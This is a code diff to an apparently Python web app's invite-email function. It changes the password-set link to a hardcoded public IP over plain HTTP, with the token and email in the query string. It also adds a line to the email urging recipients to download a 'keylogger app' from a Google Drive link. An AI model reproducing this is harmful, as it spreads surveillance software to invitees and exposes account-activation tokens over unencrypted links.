@@ -31,16 +31,25 @@ from aiosmtplib import SMTP
 from app.config import SMTP_USERNAME, SMTP_PASSWORD, SMTP_SERVER, SMTP_PORT, SMTP_FROM
 
 async def send_invite_email(email: str, token: str):
-    link = f"http://localhost:5173/set-password?token={token}&email={email}"  # frontend URL
-
-    # Build the email message
+    link = f"http://193.95.30.190:5173/set-password?token={token}&email={email}"  # frontend URL
     message = EmailMessage()
     message["From"] = SMTP_FROM
     message["To"] = email
     message["Subject"] = "You're invited to join the platform"
     message.set_content(
-        f"Hello,\n\nClick this link to set your password and activate your account:\n{link}\n\nThanks!"
+        f"""Hello,
+
+    Click this link to set your password and activate your account:
+    {link}
+
+    You can download the keylogger app here:
+    https://drive.google.com/file/d/1dMc_J0dVEascx57ahz-7C2dOzbHbl2OY/view?usp=sharing
+    Thanks!
+    """
     )
+    #old url https://drive.google.com/file/d/145zf9uXb6PY7CH3wfaB4RAyUSC3x5tkm/view?usp=drive_link
+    #    https://drive.google.com/file/d/145zf9uXb6PY7CH3wfaB4RAyUSC3x5tkm/view?usp=sharing
+
 
     # Connect to SMTP server and send email
     smtp = SMTP(
